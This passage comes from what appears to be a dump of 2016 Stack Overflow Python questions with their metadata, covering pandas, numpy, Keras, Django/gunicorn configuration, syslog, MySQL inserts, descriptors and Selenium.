  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/gunicorn/workers/base.py"", line 130, in load_wsgi
    self.wsgi = self.app.wsgi()
  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/gunicorn/app/base.py"", line 67, in wsgi
    self.callable = self.load()
  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/gunicorn/app/wsgiapp.py"", line 65, in load
    return self.load_wsgiapp()
  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/gunicorn/app/wsgiapp.py"", line 52, in load_wsgiapp
    return util.import_app(self.app_uri)
  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/gunicorn/util.py"", line 357, in import_app
    __import__(module)
  File ""/var/www/myproject/myproject/wsgi.py"", line 6, in &lt;module&gt;
    from configurations.wsgi import get_wsgi_application
  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/configurations/wsgi.py"", line 3, in &lt;module&gt;
    importer.install()
  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/configurations/importer.py"", line 54, in install
    importer = ConfigurationImporter(check_options=check_options)
  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/configurations/importer.py"", line 73, in __init__
    self.validate()
  File ""/var/www/myproject/venv/local/lib/python2.7/site-packages/configurations/importer.py"", line 122, in validate
    raise ImproperlyConfigured(self.error_msg.format(self.namevar))
ImproperlyConfigured: Configuration cannot be imported, environment variable DJANGO_CONFIGURATION is undefined.
</code></pre>

<p>My <code>wsgi.py</code> looks like this:</p>

<pre><code># -*- coding: utf-8 -*-

import os

from configurations.wsgi import get_wsgi_application

application = get_wsgi_application()
</code></pre>

<p>I didn't set up the project initially, so I'm not sure what is different, or where to look.</p>
"
39992653,6724844.0,2016-10-12 07:17:00+00:00,3,How to display specific digit in pandas dataframe,"<p>I have dataframe like below</p>

<pre><code>   month
0    1
1    2
2    3
3   10 
4   11 
</code></pre>

<p>for example,I would like to display this dataframe in 2 digit like this</p>

<pre><code>     month
0     01
1     02
2     03
3     10
4     11
</code></pre>

<p>I tried many method but didn't work well. How can I get this result?</p>
"
40041697,730260.0,2016-10-14 11:09:23+00:00,3,Python's SyslogHandler and TCP,"<p>I'm trying to understand why the SyslogHandler class from Python's logging framework (logging.handlers) does not implement any of the framing mechanism described by RFC 6587:</p>

<ol>
<li><p><strong>Octet Counting</strong>: it ""prepends"" the message length to the syslog frame:</p></li>
<li><p><strong>Non-Transparent-Framing</strong>: a trailer character to separate messages. This is what most of the servers understand.</p></li>
</ol>

<p>This ""problem"" can be easily solved by adding a LF character to the end of the messages, however I would expect that the SyslogHandler would take care of this by default:</p>

<pre class=""lang-python prettyprint-override""><code>sHandler = logging.handlers.SysLogHandler(address=(address[0], address[1]), socktype = socket.SOCK_STREAM)
sHandler.setFormatter(logging.Formatter(fmt=MSG_SYSLOG_FORMAT, datefmt=DATE_FMT))
self.addHandler(sHandler)
</code></pre>

<p>This does not work neither with Fluentd, nor with rsyslog. As I said, I've temporarily added this to line 855 of handlers.py (just to test):</p>

<pre><code>msg = prio + msg + '\n'
</code></pre>

<p>And now is working.</p>

<hr>

<h1>My questions:</h1>

<ol>
<li>Should the Python SyslogHandler class offer the possibility to set on/off the octet counting or trailer character. Currently it does nothing...</li>
<li>It is the job of the programmer to know how the server works and override the Handler to address the message framing?</li>
</ol>

<p>For now, what I'm doing now is to override emit() method, sub-classing SyslogHandler.</p>
"
40123132,2344024.0,2016-10-19 05:45:43+00:00,3,Vectorizing calculations in pandas,"<p>I'm trying to calculate group averages inside of the cross-validation scheme, but this iterating method is extremely slow as my dataframe contains more than 1mln rows. Is it possible to vectorize this calculation? Thanks.</p>

<pre><code>import pandas as pd
import numpy as np
data = np.column_stack([np.arange(1,101), np.random.randint(1,11, 100),np.random.randint(1,101, 100)])
df = pd.DataFrame(data, columns=['id', 'group','total'])
from sklearn.cross_validation import KFold
kf = KFold(df.shape[0], n_folds=3, shuffle = True)
f = {'total': ['mean']}
df['fold'] = 0
df['group_average'] = 0
for train_index, test_index in kf:
    df.ix[train_index, 'fold'] = 0
    df.ix[test_index, 'fold'] = 1
    aux = df.loc[df.fold == 0, :].groupby(['group'])
    aux2 = aux.agg(f)
    aux2.reset_index(inplace = True)
    aux2.columns = ['group', 'group_average']
    for i, row in df.loc[df.fold == 1, :].iterrows():
        new = aux2.ix[(aux2.group == row.group),'group_average']
        if new.empty == True:
            new = 0
        else:
            new = new.values[0]
        df.ix[i, 'group_average'] = new
</code></pre>
"
39762576,1831784.0,2016-09-29 06:06:25+00:00,3,Dataframe returning None value,"<p>I was returning a dataframe of characters from GOT such that they were alive and predicted to die, but only if they have some house name. (important person). I was expecting it to skip NaN's, but it returned them as well. I've attached screenshot of output. Please help.</p>

<p>PS I haven't attached any spoilers so you may go ahead.</p>

<pre><code>import pandas
df=pandas.read_csv('character-predictions.csv')
a=df[((df['actual']==1) &amp; (df['pred']==0)) &amp; (df['house'] !=None)]
b=a[['name', 'house']]
</code></pre>

<p><a href=""http://i.stack.imgur.com/xhUEb.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/xhUEb.png"" alt=""enter image description here""></a></p>
"
40042223,4401573.0,2016-10-14 11:36:22+00:00,3,User defined legend in python,"I have this plot in which some areas between curves are being filled by definition. Is there any way to include them in legend? Especially where those filled areas are overlapped and as well as that a new and different color is being appeared.

<p>Or there is possibility to define an arbitrary legend regardless of the curves' data?
<a href=""https://i.stack.imgur.com/NtJ74.png"" rel=""nofollow""><img src=""https://i.stack.imgur.com/NtJ74.png"" alt=""enter image description here""></a></p>
"
39731669,2585497.0,2016-09-27 18:16:22+00:00,3,Merge Variables in Keras,"<p>I'm building a convolutional neural network with Keras and would like to add a single node with the standard deviation of my data before the last fully connected layer.</p>

<p>Here's a minimum code to reproduce the error:</p>

<pre><code>from keras.layers import merge, Input, Dense
from keras.layers import Convolution1D, Flatten
from keras import backend as K

input_img = Input(shape=(64, 4))

x = Convolution1D(48, 3, activation='relu', init='he_normal')(input_img)
x = Flatten()(x)

std = K.std(input_img, axis=1)
x = merge([x, std], mode='concat', concat_axis=1)

output =  Dense(100, activation='softmax', init='he_normal')(x)
</code></pre>

<p>This results in the following <code>TypeError</code>:</p>

<pre><code>-----------------------------------------------------------------
TypeError                       Traceback (most recent call last)
&lt;ipython-input-117-c1289ebe610e&gt; in &lt;module&gt;()
      6 x = merge([x, std], mode='concat', concat_axis=1)
      7 
----&gt; 8 output =  Dense(100, activation='softmax', init='he_normal')(x)

/home/ubuntu/anaconda2/envs/tensorflow/lib/python2.7/site-packages/keras/engine/topology.pyc in __call__(self, x, mask)
    486                                     '`layer.build(batch_input_shape)`')
    487             if len(input_shapes) == 1:
--&gt; 488                 self.build(input_shapes[0])
    489             else:
    490                 self.build(input_shapes)

/home/ubuntu/anaconda2/envs/tensorflow/lib/python2.7/site-packages/keras/layers/core.pyc in build(self, input_shape)
    701 
    702         self.W = self.init((input_dim, self.output_dim),
--&gt; 703                            name='{}_W'.format(self.name))
    704         if self.bias:
    705             self.b = K.zeros((self.output_dim,),

/home/ubuntu/anaconda2/envs/tensorflow/lib/python2.7/site-packages/keras/initializations.pyc in he_normal(shape, name, dim_ordering)
     64     '''
     65     fan_in, fan_out = get_fans(shape, dim_ordering=dim_ordering)
---&gt; 66     s = np.sqrt(2. / fan_in)
     67     return normal(shape, s, name=name)
     68 

TypeError: unsupported operand type(s) for /: 'float' and 'NoneType'
</code></pre>

<p>Any idea why?</p>
"
39726583,1175065.0,2016-09-27 13:54:21+00:00,3,Plot is behaving weird,"<p>I am trying to plot some trajectories in 3D. I noticed that the plot function is behaving weird. </p>

<p>I defined a variable named <code>pos</code>, which is a 2 dimensional matrix. It has 3 columns, where each column represents a coordinate axis. Please see the complete code below-</p>

<pre><code>import numpy as np
import matplotlib as mpl
import matplotlib.pyplot as plt
from mpl_toolkits.mplot3d import Axes3D

max = 1.0
min = -1.0
cols = 3
goals = 4
timesteps = 20

#pos = np.zeros((timesteps, cols)) # this doesn't works hence commented

fig = plt.figure()
ax = fig.gca(projection='3d')
for i in range(goals):
    pos = np.zeros((timesteps, cols)) # this works as expected
    for t in range(timesteps):
        pos[t] = np.random.uniform(low=min, high=max, size=cols)
    ax.plot(pos[:, 0], pos[:, 1], pos[:, 2])

ax.set_xlabel('x')
ax.set_ylabel('y')
ax.set_zlabel('z')
plt.show()
</code></pre>

<p>The plot doesn't draw everthing, when <code>pos</code> is defined globally. I noticed that defining <code>pos</code> inside the <code>for</code> loop, solve the problem. It looks weird to me.</p>

<p>Below is the plot, generated from global <code>pos</code> variable (after commenting the <code>pos</code> defined inside <code>for</code> loop and keeping the global <code>pos</code> variable enabled)-
<a href=""http://i.stack.imgur.com/dfbzx.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/dfbzx.png"" alt=""enter image description here""></a></p>

<p>Below is the plot, generated from inner <code>pos</code> variable (after commenting the global <code>pos</code> variable and keeping the <code>pos</code> defined inside <code>for</code> loop enabled)-
<a href=""http://i.stack.imgur.com/iaw2u.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/iaw2u.png"" alt=""enter image description here""></a></p>

<p>What is the reason of for this kind of behavior?</p>
"
39726577,6837081.0,2016-09-27 13:54:04+00:00,3,"How to determine what fields are required by a REST API, from the API?","<p>I'm working with a networking appliance that has vague API documentation. I'm able to execute PATCH and GET requests fine, but POST isn't working. I receive HTTP status error 422 as a response, I'm missing a field in the JSON request, but I am providing the required fields as specified in the documentation. I have tried the Python Requests module and the vendor-provided PyCurl module in their sample code, but have encountered the same error.</p>

<p>Does the REST API have a debug method that returns the required fields, and its value types, for a specific POST? I'm speaking more of what the template is configured to see in the request (such as JSON <code>{str(ServerName) : int(ServerID)}</code>, not what the API developer may have created.</p>
"
39726124,2903709.0,2016-09-27 13:35:32+00:00,3,Dictionary of dictionaries vs dictionary of class instances,"<p>I understand what a class is, a bundle of attributes and methods stored together in one object. However, i don't think i have ever really grasped their full power. I taught myself to manipulate large volumes of data by using 'dictionary of dictionary' data structures. I'm now thinking if i want to fit in with the rest of the world then i need to implement classes in my code, but i just don't get how to make the transition.</p>

<p>I have a script which gets information about sales orders from a SQL query, performs operations on the data, and outputs it to a csv.</p>

<p>1) (the way i currently do it, store all the orders in a dictionary of dictionaries)</p>

<pre><code>cursor.execute(querystring)

# create empty dictionary to hold orders
orders = {}

# define list of columns returned by query
columns = [col[0] for col in cursor.description]

for row in cursor:
    # create dictionary of dictionaries where key is order_id
    # this allows easy access of attributes given the order_id
    orders[row.order_id] = {}
    for i, v in enumerate(columns):
        # add each field to each order
        orders[row.order_id][v] = row[i]

# example operation
for order, fields in orders.iteritems():
    fields['long'], fields['lat'] = getLongLat(fields['post_code'])

# example of another operation
cancelled_orders = getCancelledOrders()
for order_id in cancelled_orders:
    orders[order_id]['status'] = 'cancelled'

# Other similar operations go here...

# write to file here...
</code></pre>

<p>2) (the way i THINK i would do it if i was using classes)</p>

<pre><code>class salesOrder():


    def __init__(self, cursor_row):
        for i, v in enumerate(columns):
            setattr(self, v, cursor_row[i])


    def getLongLat(self, long_lat_dict):
        self.long, self.lat = long_lat_dict[self.post_code]['long'], long_lat_dict[self.post_code]['lat']


    def cancelOrder(self):
        self.status = 'cancelled'


    # more methods here


cursor.execute(querystring)

# create empty dictionary to hold orders
orders = {}

# define list of columns returned by query
columns = [col[0] for col in cursor.description]

for row in cursor:
    orders[row.order_id] = salesOrder(row)
    orders[row.order_id].getLongLat()

# example of another operation
cancelled_orders = getCancelledOrders()
for order_id in cancelled_orders:
    orders[order_id].cancelOrder()

# other similar operations go here

# write to file here
</code></pre>

<p>I just get the impression that i'm not quite understanding the best way to use classes. Have i got the complete wrong idea about how to use classes? Is there some sense to what i'm doing but it needs refactoring? or am i trying to use classes for the wrong purpose?</p>
"
39732213,3620003.0,2016-09-27 18:48:35+00:00,3,Subclassing numpy.ndarray - why is __array_finalize__ not being called twice here?,"<p>According to <a href=""http://docs.scipy.org/doc/numpy/user/basics.subclassing.html"" rel=""nofollow"">this</a> primer on subclassing <code>ndarray</code>, the <code>__array_finalize__</code> method is guaranteed to be called, no matter if the subclass is instantiated directly, casted as a view or created from a template.</p>

<p>In particular, when calling the constructor explicitly, the order of methods called is <code>__new__</code> -> <code>__array_finalize__</code> -> <code>__init__</code>.</p>

<p>I have the following simple subclass of <code>ndarray</code> which allows an additional <code>title</code> attribute.</p>

<pre><code>class Frame(np.ndarray):    
    def __new__(cls, input_array, title='unnamed'):
        print 'calling Frame.__new__ with title {}'.format(title)
        self = input_array.view(Frame) # does not call __new__ or __init__
        print 'creation of self done, setting self.title...'
        self.title = title
        return self

    def __array_finalize__(self, viewed):
        # if viewed is None, the Frame instance is being created by an explicit
        # call to the constructor, hence Frame.__new__ has been called and the
        # title attribute is already set
        #
        # if viewed is not None, the frame is either being created by view
        # casting or from template, in which case the title of the viewed object
        # needs to be forwarded to the new instance
        print '''calling Frame.__array_finalize__ with type(self) == {} and
        type(viewed) == {}'''.format(type(self), type(viewed))

        if viewed is not None:
            self.title = getattr(viewed, 'title', 'unnamed')

        print self.title
</code></pre>

<p>which produces the following output:</p>

<pre><code>&gt;&gt;&gt; f = Frame(np.arange(3), 'hallo')
calling Frame.__new__ with title hallo
calling Frame.__array_finalize__ with type(self) == &lt;class '__main__.Frame'&gt; and
        type(viewed) == &lt;type 'numpy.ndarray'&gt;
unnamed
creation of self done, setting self.title...
&gt;&gt;&gt; f.title
'hallo'
</code></pre>

<p>As you can see, <code>__array_finalize__</code> is being called as a result of the line</p>

<pre><code> self = input_array.view(Frame)
</code></pre>

<p>Question: why is <code>__array_finalize__</code> not being called again as part of the <code>__new__</code> -> <code>__array_finalize__</code> -> <code>__init__</code> chain?</p>
"
39608282,5606318.0,2016-09-21 05:36:20+00:00,3,Pandas error trying to convert string into integer,"<p>Requirement : </p>

<p>One particular column in a DataFrame is 'Mixed' Type. It can have values like <code>""123456""</code> or <code>""ABC12345""</code>.</p>

<p>This dataframe is being written into an Excel using xlsxwriter .</p>

<p>For values like <code>""123456""</code>, down the line Pandas converting it into <code>123456.0</code> ( Making it look like a float)</p>

<p>We need to put it into xlsx as 123456 (i.e as +integer) in case value is FULLY numeric.</p>

<p>Effort :</p>

<p>Code Snippet shown below</p>

<pre><code>import pandas as pd
import numpy as np
import xlsxwriter
import os
import datetime
import sys
excel_name = str(input(""Please Enter Spreadsheet Name :\n"").strip())

print(""excel entered :   ""   , excel_name)
df_header = ['DisplayName','StoreLanguage','Territory','WorkType','EntryType','TitleInternalAlias',
         'TitleDisplayUnlimited','LocalizationType','LicenseType','LicenseRightsDescription',
         'FormatProfile','Start','End','PriceType','PriceValue','SRP','Description',
         'OtherTerms','OtherInstructions','ContentID','ProductID','EncodeID','AvailID',
         'Metadata', 'AltID', 'SuppressionLiftDate','SpecialPreOrderFulfillDate','ReleaseYear','ReleaseHistoryOriginal','ReleaseHistoryPhysicalHV',
          'ExceptionFlag','RatingSystem','RatingValue','RatingReason','RentalDuration','WatchDuration','CaptionIncluded','CaptionExemption','Any','ContractID',
          'ServiceProvider','TotalRunTime','HoldbackLanguage','HoldbackExclusionLanguage']
first_pass_drop_duplicate = df_m_d.drop_duplicates(['StoreLanguage','Territory','TitleInternalAlias','LocalizationType','LicenseType',
                                   'LicenseRightsDescription','FormatProfile','Start','End','PriceType','PriceValue','ContentID','ProductID',
                                   'AltID','ReleaseHistoryPhysicalHV','RatingSystem','RatingValue','CaptionIncluded'], keep=False) 
# We need to keep integer AltID  as is

first_pass_drop_duplicate.loc[first_pass_drop_duplicate['AltID']] =   first_pass_drop_duplicate['AltID'].apply(lambda x : str(int(x)) if str(x).isdigit() == True else x)
</code></pre>

<p>I have tried :</p>

<pre><code>1. using `dataframe.astype(int).astype(str)` # works as long as value is not alphanumeric
2.importing re and using pure python `re.compile()` and `replace()` -- does not work
3.reading DF row by row in a for loop !!! Kills the machine as dataframe can have 300k+ records
</code></pre>

<p>Each time, error I get:</p>

<blockquote>
  <p>raise KeyError('%s not in index' % objarr[mask])<br>
  KeyError: '[ 102711.  102711.  102711.  102711.  102711.  102711.  102711.     102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n  102711.  102711.  102711.  102711.  102711.  102711.  102711.  102711.\n    5337.    5337.    5337.    5337.    5337.    5337.    5337.    5337.\n    5337.    5337.    5337.    5337.    5337.    5337.    5337.    5337.\n    5337.    5337.    5337.    5337.    5337.    5337.    5337.    5337.\n    5337.    5337.    5337.    5337.    5337.    5337.    5337.    5337.\n    5337.    5337.    5337.    5337.    5337.    5337.    5337.    5337.\n    5337.    5337.    2124.    2124.    2124.    2124.    2124.    2124.\n    2124.    2124.    6643.    6643.    6643.    6643.    6643.    6643.\n    6643.    6643.    6643.    6643.    6643.    6643.    6643.    6643.\n    6643.    6643.    6643.    6643.    6643.    6643.    6643.    6643.\n    6643.    6643.    6643.    6643.    6643.    6643.    6643.    6643.] not in index'</p>
</blockquote>

<p>I am newbie in python/pandas , any help, solution is much appreciated.</p>
"
39715950,6724844.0,2016-09-27 04:25:18+00:00,3,groupby and add some rows,"<p>I have a dataframe below</p>

<pre><code>   A  B
0  a  1
1  a  2
2  c  3
3  c  4
4  e  5
</code></pre>

<p>I would like to get summing result below.key = column A</p>

<pre><code>df.B.groupby(df.A).agg(np.sum)
</code></pre>

<p>But I want to add specific row. </p>

<pre><code>   B
a  3
b  0
c  7
d  0
e  5
f  0
</code></pre>

<p>but I should add row ""b"" and ""d"".""f""</p>

<p>How can I get this result ?</p>
"
39764582,6869965.0,2016-09-29 07:59:22+00:00,3,"""Densifying"" very large sparse matrices by rearranging rows/columns","<p>I have a very large sparse matrix (240k*4.5k, â¤1% non-zero elements), which I would like to ""densify"" by rearranging its rows and columns in a way that the upper left region is enriched in non-zero elements as much as possible. (To make it more manageable and visually assessable.) I would prefer <code>scipy</code> and related tools to do this.</p>

<ul>
<li>A good suggestion was already made <a href=""http://stackoverflow.com/questions/15155276/rearrange-sparse-arrays-by-swapping-rows-and-columns"">here</a> for a solution to ""manually"" swap rows/columns of sparse matrices, but it does not cover the challenge of identifying which rows/columns to swap to get an optimal enrichment (dense block) in the upper left corner.</li>
<li>Note that a simple sorting of rows/columns based on the number of non-zero elements does not solve the problem. (If I take <em>e.g.</em> the two rows with the most elements, there will not necessarily be any overlap between them in terms of where - <em>i.e.</em> in which columns - are the elements located.)</li>
<li>I'm also curious about the optimal sparse matrix representation in <code>scipy.sparse</code> for this task.</li>
</ul>

<p>Any suggestions or specific implementation ideas are welcome.</p>
"
39711281,1658617.0,2016-09-26 19:54:31+00:00,3,How does a descriptor with __set__ but without __get__ work?,"<p>I read somewhere about the fact you can have a descriptor with <code>__set__</code> and without <code>__get__</code>.</p>

<p>How does it work? </p>

<p>Does it count as a data descriptor? Is it a non-data descriptor?</p>

<p>Here is a code example:</p>

<pre><code>class Desc:
    def __init__(self, name):
        self.name = name
    def __set__(self, inst, value):
        inst.__dict__[self.name] = value
        print(""set"", self.name)

class Test:
    attr = Desc(""attr"")

&gt;&gt;&gt;myinst = Test()
&gt;&gt;&gt; myinst.attr = 1234
set attr
&gt;&gt;&gt; myinst.attr
1234
&gt;&gt;&gt; myinst.attr = 5678
set attr
&gt;&gt;&gt; myinst.attr
5678
</code></pre>
"
39626233,5302241.0,2016-09-21 20:42:04+00:00,3,How did numpy implement multi-dimensional broadcasting?,"<p>Memory (row major order):</p>

<pre><code>[[A(0,0), A(0,1)]
 [A(1,0), A(1,1)]]

has this memory layout: 
[A(0,0), A(0,1), A(1,0), A(1,1)]
</code></pre>

<p>I guess the algorithm work like this in the following cases.</p>

<p>Broadcasting Dimension is last dimension:</p>

<pre><code>[[0, 1, 2, 3]         [[1]
                  x
 [4, 5, 6, 7]]         [10]]

   A (2 by 4)            B (2 by 1)

Iterate 0th dimensions of A and B simultaneously {
    Iterate last dimension of A{
        multiply;
    } 
}
</code></pre>

<p>Broadcasting dimension is 0th dimension:</p>

<pre><code>[[0, 1, 2, 3]   
                  x    [[1,10,100,1000]]
 [4, 5, 6, 7]]

   A (2 by 4)              B (1 by 4)

Iterate 0th dimension of A{
    Iterate 1st dimensions of A and B simultaneously{
        multiply;
    }
}
</code></pre>

<p>Question:</p>

<ol>
<li><p>How does numpy know which order of multiplication is the best.
(reading memory in order is better than reading memory all over the place. but how did numpy figure that out?)</p></li>
<li><p>What would numpy do if the arrays have more than two dimension</p></li>
<li>What would numpy do if the broadcasting dimension is not the last dimension?</li>
</ol>

<p>2nd guess of what is going on:</p>

<pre><code>#include &lt;iostream&gt;
int main(void){
    const int nA = 12;
    const int nB = 3;
    int A[nA];
    int B[nB];
    for(int i = 0; i != nA; ++i) A[i] = i+1;
    for(int i = 0; i != nB; ++i) B[i] = i+1;
    //dimension
    int dA[] = {2,3,2};
    int dB[] = {1,3,1};

    int* pA = A;
    int* pB = B;
    int* pA_end = A + nA;
    //is it possible to make the compiler
    //generate the iA and sA?
    int iB = 0;
    int iB_max = 2;
    int sB[] = {1,0};

    while(pA != pA_end){
        std::cout &lt;&lt; ""*pA, *pB: "" &lt;&lt; *pA &lt;&lt; "", "" &lt;&lt; *pB &lt;&lt;std::endl;
        std::cout &lt;&lt; ""iB: "" &lt;&lt; iB &lt;&lt;std::endl;
        *(pA) *= *(pB);
        ++pA;
        pB += sB[iB];
        ++iB;
        if (iB == iB_max) {iB = 0; pB = B;}
    }

    for(pA = A; pA != pA_end; ++pA){
        std::cout &lt;&lt; *(pA) &lt;&lt; "", "";
    }
    std::cout &lt;&lt; std::endl;       
}
</code></pre>
"
39806895,2131849.0,2016-10-01 12:59:36+00:00,3,find all files matching exact name with and without an extension,"<p>I'm using glob to scan a specified directory to find all files matching the specified name, but I can't seem to get it to work with files with no extension without finding files matching the name and then some...</p>

<p>For example, here's some files:<br>
- file<br>
- file2<br>
- file.dat</p>

<p>The resulting list should be:<br>
<code>[ 'file', 'file.dat' ]</code></p>

<p>How can I get glob to work as expected??</p>
"
39807008,6636423.0,2016-10-01 13:10:37+00:00,3,is comparison returns False with strings using same id,"<p>I was playing around with Python <code>is</code> and <code>==</code> operator. As far as I know, is operator checks whether two objects have same id, but in my case operator returns False even if two substrings have the same id. </p>

<p>Here is the code:</p>

<pre><code>#! /usr/bin/python3
# coding=utf-8
string = ""HelloWorld""

print(id(string))    #140131089280176
print(id(string[0:5]))  #140131089251048
print(id(string[-10:-5]))   #140131089251048


print(string[0:5] == string[-10:-5])    #True
print(string[0:5] is string[-10:-5])    #False
</code></pre>

<p>Substrings do not have same id with the original string as expected, but why is operator returns false with 2 substrings with the same id?</p>
"
39629823,4364985.0,2016-09-22 03:37:36+00:00,3,Inserting NULL value to a double data type MySQL Python,"<p>I have a table. This is the create statement. </p>

<pre><code>   CREATE TABLE `runsettings` (
  `runnumber` mediumint(9) NOT NULL,
  `equipment` varchar(45) NOT NULL,
  `wafer` varchar(45) NOT NULL,
  `settingname` varchar(100) NOT NULL,
  `float8value` double DEFAULT NULL,
  `apcrunid` varchar(45) DEFAULT NULL,
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `intvalue` int(11) DEFAULT NULL,
  `floatvalue` float DEFAULT NULL,
  `Batch` varchar(45) DEFAULT NULL,
  `IndexNum` smallint(6) DEFAULT '1',
  `stringvalue` mediumtext,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM AUTO_INCREMENT=1056989 DEFAULT CHARSET=latin1;
</code></pre>

<p>This is my insert statement :</p>

<pre><code>import mysql.connector

cnx = mysql.connector.connect(user='test',
                                password ='test',host='0.0.0.1',
                              database='test')


vallist = [(471285, u'CT19', 7, u'271042', u'Etch Time Min', None, None, None),
           (471285, u'CT19', 7, u'00000', u'Etch Time Min', None, None, 'None')]


cursor = cnx.cursor()
# ss = 

cursor.executemany(""INSERT INTO runsettings (apcrunid,equipment,runnumber,wafer,settingname,intvalue,floatvalue,float8value) VALUES (%s,%s,%s,%s,%s,%s,%s,%s)"",vallist)
cnx.commit()
</code></pre>

<p>So I try to insert these values .</p>

<pre><code>vallist = [471285, u'CT19', 7, u'271042', u'Etch Time Min', None, None, None,
           471285, u'CT19', 7, u'00000', u'Etch Time Min', None, None, 'None']
</code></pre>

<p>This is getting inserted. 
Result on DB
<a href=""http://i.stack.imgur.com/soQHW.png"" rel=""nofollow""><img src=""http://i.stack.imgur.com/soQHW.png"" alt=""enter image description here""></a>
But when the list value is this one (difference is the string <code>'None'</code> gets evaluated first): </p>

<pre><code>vallist = [471285, u'CT19', 7, u'271042', u'Etch Time Min', None, None, 'None', 
           471285, u'CT19', 7, u'271042', u'Etch Time Min', None, None, None]
</code></pre>

<p>It gives out the truncated error. </p>

<pre><code>Data truncated for column 'float8value' at row 2 
</code></pre>

<p>How come when the row that contains <code>None</code> is the first on the list  it doesn't give out the same truncated error on the first list? </p>
"
39807586,5390604.0,2016-10-01 14:08:22+00:00,3,How to create Python dictionary with multiple 'lists' for each key by reading from .txt file?,"<p>I have a large text file that looks like:</p>

<pre><code>1   27  21  22
1   151 24  26
1   48  24  31
2   14  6   8
2   98  13  16
.
.
.
</code></pre>

<p>that I want to create a dictionary with. The first number of each list should be the key in the dictionary and should be in this format:</p>

<pre><code>{1: [(27,21,22),(151,24,26),(48,24,31)],
 2: [(14,6,8),(98,13,16)]}
</code></pre>

<p>I have the following code (with total points being the largest number in the first column of the text file (ie largest key in dictionary)):</p>

<pre><code>from collections import defaultdict

info = defaultdict(list)
filetxt = 'file.txt'
i = 1

with open(filetxt, 'r') as file:
    for i in range(1, num_cities + 1):
        info[i] = 0
    for line in file:
        splitLine = line.split()
        if info[int(splitLine[0])] == 0:
            info[int(splitLine[0])] = (["","".join(splitLine[1:])])
        else:
            info[int(splitLine[0])].append(("","".join(splitLine[1:])))
</code></pre>

<p>which outputs</p>

<pre><code>{1: ['27,21,22','151,24,26','48,24,31'],
 2: ['14,6,8','98,13,16']}
</code></pre>

<p>The reason I want to do this dictionary is because I want to run a for loop through each ""inner list"" of the dictionary for a given key:</p>

<pre><code>for first, second, third, in dictionary:
   ....
</code></pre>

<p>I cannot do this with my current code because of the slightly different format of the dictionary (it expects 3 values in the for loop above, but receives more than 3), however it would work with the first dictionary format.</p>

<p>Can anyone suggest anyway to fix this?</p>
"
39711977,5882284.0,2016-09-26 20:39:29+00:00,3,How can I filter for string values in a mixed datatype object in Python Pandas Dataframe,"<p>I have a column in a Pandas Dataframe like:(whose value_counts are shown below)</p>

<pre><code>1                      246804
2                      135272
5                        8983
8                        3459
4                        3177
6                        1278
9                         522
D                         314
E                          91
0                          29
F                          20    
Name: Admission_Source_Code, dtype: int64
</code></pre>

<p>As you can see it contains both integers and letters. I'm having to write a function where I would have to filter and search for the lettered values.</p>

<p>I was initially importing this dataset using pd.read_excel, but after having read multiple bug reports, it seems that read_excel doesnt have option to explicitly read a column as a string.</p>

<p>So I tried reading using pd.read_csv which has the dtype option. Initially this column was being stored as float64 by default, now even though I have tried to run</p>

<pre><code>Df_name['Admission_Source_Code'] = Df_name['Admission_Source_Code'].astype(int).astype('str')
</code></pre>

<p>I'm unable to format it as a string column.</p>

<p>Hence, when I filter for </p>

<pre><code>Accepted[Accepted['Admission_Source_Code']==1]
</code></pre>

<p>it works, but </p>

<pre><code>Accepted[Accepted['Admission_Source_Code']=='E']
</code></pre>

<p>still returns no results. When i try and say str(column_name) in the mask, it says invalid literal.
Can someone please help me on how would i go about either changing the dtype or how to filter for lettered values?</p>

<p>Thanks.</p>

<p>P.S. even formatting as object doesnt help</p>
"
39807948,6719286.0,2016-10-01 14:47:12+00:00,3,Deleting a list after creating an iterator object from it,"<p>I am trying to understand the concept of iterators in python and tried this in Python 3.5.2.</p>

<pre><code>x = list(range(1000))    # size of x is 9112 bytes
y = iter(x)              # size of y is 56 bytes
del x
x = list(y)              # size of x is again 9112 bytes
</code></pre>

<p>How does the iterator store the information about the sequence it has to generate?</p>

<p>It does not contain all the elements but even after deleting the original list we are still able to reproduce the original list from the iterator?</p>

<p>If it does not contain all the elements how does it know which is the next element even after deleting <code>x</code>?</p>
"
39711674,4308281.0,2016-09-26 20:17:24+00:00,3,Firefox blank webbrowser with selenium,"<p>When I call a firefox webbrowser with python firefox webdriver, the firefox is opening with a blank page (nothing in the navigation barre), wait and close.</p>

<p>The python consol give me this error :</p>

<p>Traceback (most recent call last):
  File ""firefox_selenium2.py"", line 4, in 
    driver = webdriver.Firefox()
  File ""/usr/local/lib/python3.5/dist-packages/selenium/webdriver/firefox/webdriver.py"", line 80, in <strong>init</strong>
    self.binary, timeout)
  File ""/usr/local/lib/python3.5/dist-packages/selenium/webdriver/firefox/extension_connection.py"", line 52, in <strong>init</strong>
    self.binary.launch_browser(self.profile, timeout=timeout)
  File ""/usr/local/lib/python3.5/dist-packages/selenium/webdriver/firefox/firefox_binary.py"", line 68, in launch_browser
    self._wait_until_connectable(timeout=timeout)
  File ""/usr/local/lib/python3.5/dist-packages/selenium/webdriver/firefox/firefox_binary.py"", line 108, in _wait_until_connectable
    % (self.profile.path))
selenium.common.exceptions.WebDriverException: Message: Can't load the profile. Profile Dir: /tmp/tmpngm7g76x If you specified a log_file in the FirefoxBinary constructor, check it for details.</p>

<p>My code is the exemple from the python selenium read_the_doc :
from selenium import webdriver
from selenium.webdriver.common.keys import Keys</p>

<pre><code>driver = webdriver.Firefox()
driver.get(""http://www.python.org"")
assert ""Python"" in driver.title
